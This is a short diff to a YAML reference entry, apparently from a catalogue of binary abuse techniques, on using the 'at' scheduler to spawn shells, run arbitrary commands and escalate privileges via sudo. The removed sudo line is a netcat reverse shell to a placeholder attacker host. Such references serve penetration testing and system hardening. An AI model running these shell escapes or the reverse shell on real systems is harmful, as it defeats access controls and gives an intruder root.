@@ -1,8 +1,14 @@
 ---
-description: |
-  at is a command-line utility that allows you to schedule commands to be executed at a particular time.
 functions:
+  shell:
+    - code: |
+        echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
+  command:
+    - description: The invocation will be blind, but it is possible to redirect the output to a file in a readable location.
+      code: |
+        COMMAND=id
+        echo "$COMMAND" | at now
   sudo:
     - code: |
-        echo "nc attacker.com 12345 -e /bin/bash" | sudo at now +1 minutes
+        echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
 ---
